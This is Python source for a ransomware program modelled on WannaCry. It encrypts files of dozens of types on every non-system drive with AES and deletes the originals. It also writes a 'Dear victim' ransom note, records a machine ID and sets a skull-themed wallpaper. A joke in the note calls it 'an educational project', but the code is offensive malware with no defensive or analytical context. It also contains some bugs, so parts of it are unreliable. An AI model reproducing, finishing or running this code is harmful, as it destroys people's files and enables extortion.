import os, sys, requests, json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import base64, uuid, time, ctypes, logging, threading
import tkinter as tk
from tkinter import messagebox, filedialog, simpledialog
from datetime import datetime, timedelta
from tkinter import ttk
from PIL import Image, ImageTk


def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def time_dir_exists():
    if not os.path.exists(TIME_DIR):
        os.mkdirs(TIME_DIR)

def load_machine_id():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        machine_id_path = os.path.join(drive, "machine_id.txt")
        if os.path.exists(machine_id_path):
            try:
                with open(machine_id_path, 'r') as f:
                    machine_id = f.read().strip()
                    print(f"Successfully found machine id from {machine_id_path}: {machine_id}")
                    return machine_id
            except FileNotFoundError:
                continue
    return None

TERMINATION_KEY = "bingo"
SECONDARY_TERMINATION_KEY = "stop"
HOME_DIR = os.path.expanduser("~")
TIME_DIR = os.path.join(HOME_DIR, '.wannacry_time')
TIME_STATE_DIR = os.path.join(TIME_DIR, 'timer_state.txt')
WALLPAPER_PATH = resource_path('resources/wallpaper.png')
ICON_PATH = resource_path('resources/skull.ico')
THANKYOU_PATH = resource_path('resources/thanks.png')
WIN_DIR = os.environ.get("SYSTEMDRIVE")

time_dir_exists()

DRIVES_TO_ENCRYPT = [f'{d}:\\' for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f'{d}:\\') and f'{d}:'!=WIN_DIR]
EXTENSIONS_TO_ENCRYPT = [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".csv", ".html", ".htm", ".xml", ".json", 
".zip", ".rar", ".tar", ".gz", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp3", ".wav", ".aac", ".ogg", ".mp4", ".avi", ".mov", 
".wmv", ".mkv", ".exe", ".msi", ".apk", ".bat", ".sh", ".dll", ".iso", ".img", ".dmg", ".psd", ".ai", ".indd", ".svgz", ".eps", ".webp", ".yml", ".yaml",
".md", ".log", ".sql", ".bak", ".pem", ".cer", ".crt", ".p12", ".pfx", ".key", ".jks", ".nupkg", ".whl", ".class", ".jar", ".pl", ".py", ".rb", ".go", ".c", ".cpp", ".h", ".cs",
".swift", ".php", ".asp", ".jsp", ".vb", ".properties", ".torrent"]
PASSWORD_PROVIDED = "PleaseGiveMeMoney"
DASHBOARD_URL = 'http://localhost/'
MAX_ATTEMPTS = 10
DELAY = 5

logging.basicConfig(
    filemode='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)

class EncryptionTool:
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delays=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delays = delays
        self.key = self.generate_key(password)
        self.machine_id = str(uuid.uuid4())
    
    def generate_key(password):
        try:
            salt = get_random_bytes(16)
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            logging.info("Key generated Successfully")
            return key
        except Exception as e:
            logging.error(f"Failed to generate key: {str(e)}")
            raise

    def set_wallpaper(self, path):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20,0,path,0)
            logging.info(f"Wallpaper set successfully to: {path}")
        except Exception as e:
            logging.error(f"Failed to set wallpaper: {str(e)}")

    def create_important_files(self, directory_path):
        try:
            d_data_path = os.path.join(directory_path, 'D-Data')
            os.makedirs(d_data_path, exist_ok=True)

            filenames = ['Annual_Report_2022.docx', 'Financials_03.xlsx', 'Employee_Contacts.pdf']
            file_contents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']

            for filename, content in zip(filenames, file_contents):
                file_path = os.path.join(d_data_path, filename)
                open(file_path, 'w').write(content)

            logging.info(f"Successfully created important files at: {d_data_path}")
        except Exception as e:
            logging.error(f"Error creating important files: {str(e)}")

    def encrypt_file(self, file_path):
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            file_data = open(file_path, 'rb').read()
            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
            try: 
                os.remove(file_path)
                open(file_path + '.encrypted', 'wb').write(iv + encrypted_data)
            except: 
                open(file_path, 'wb').write(iv + encrypted_data)

            logging.info(f"Encrypted: {file_path}")
        except Exception as e:
            logging.error(f"Failed to encrypt {file_path}: {str(e)}")

    def encrypt_files_in_directory(self, directory_path):
        try:
            for root, dirs, files in os.walk(directory_path):
                if '$RECYCLE.BIN' in root: continue

                for file in files:
                    if any(file.endswith(ext) for ext in self.extensions):
                        self.encrypt_file(os.path.join(root, file))
            
            logging.info(f"Successfully encrypted files in directory: {directory_path}")
        except Exception as e:
            logging.error(f"Error encryting {directory_path}: {str(e)}")

    def create_user_manual(self, directory_path):
        manual = f"""Dear victim,
All your juicy files have been encrypted on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} and your machine have been assigned with id: "{self.machine_id}".
Any false attempt of recovery will turn your pc into a toaster which later you can use to toast bread.
joking hahahahaha, this is an educational project but I assume that you ran this software unknowingly or accidentally.
no worries, just knock on the email provided and he will try his best to recover your machine. No need to worry.

Best Regards,
Defalt
"""
        manual_path = os.path.join(directory_path, "README_FOR_DECRYPTION.txt")
        try:
            if not os.path.exists(directory_path):
                os.makedirs(directory_path, exist_ok=True)
            open(manual_path, 'w').write(manual)

            logging.info(f"Successfully created user manual {manual_path}")
    
        except Exception as e: 
            logging.error(f"Error creating user manual {str(e)}")

    def save_machine_id(self, directory_path):
        machine_id_path = os.path.join(directory_path, "machine_id.txt")

        try:
            os.makedirs(directory_path, exist_ok=True)
            open(machine_id_path, "w").write(self.machine_id)
            logging.info(f"Saved machine id at {machine_id_path}")
        except Exception as e: 
            logging.error(f"Error saving machine id {str(e)}")

    
    def process_drive(self, drive):
        self.create_important_files(drive)
        self.encrypt_files_in_directory(drive)
        self.create_user_manual(drive)
        self.save_machine_id(drive)

    def execute(self):
        for drive in self.drives:
            logging.info(f"Processing drive: {drive}")
            self.process_drive(drive)
            logging.info(f"Done processing drive: {drive}")
        
        wallpaper_path = 'resources/wallpaper.png'
        self.set_wallpaper(wallpaper_path)
        logging.info(f"Encryption processs done")

class TerminationKeyDialog(tk.Toplevel):
    
    def __init__(self, parent, icon_path):
        super().__init__(parent)
        self.iconphoto(False, tk.PhotoImage(file=icon_path))
        self.title("Termination Key")
        self.geometry("300x100")
        self.result = None
        tk.Label(self, text="Enter the termination key to exit:").pack(pady=5)
        self.key_entry = tk.Entry(self)
        self.key_entry.pack(pady=5)
        self.key_entry.focus_set()
        tk.Button(self, text="Submit", command=self.on_submit).pack(pady=5)

    def on_submit(self):
        self.result = self.key_entry.get()
        self.destroy()

class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):

    def __init__(self, parent, icon_path, title, prompt):
        self.icon_path = icon_path
        self.prompt = prompt
        super().__init__(parent, title)

    def body(self, master):
        self.iconphoto(False, tk.PhotoImage(file=self.icon_path))
        tk.Label(master, text=self.prompt).pack(pady=5)
        self.key_entry = tk.Entry(master)
        self.key_entry.pack(pady=5)
        return self.key_entry
    
    def apply(self):
        self.result = self.key_entry.get()

    def center_window(self):
        self.update_idletasks()
        window_width = self.winfo_width()
        window_height = self.winfo_height()
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        position_right = int(screen_width/2 - window_width/2)
        position_down = int(screen_height/2 - window_height/2)
        self.geometry(f"+{position_right}+{position_down}")

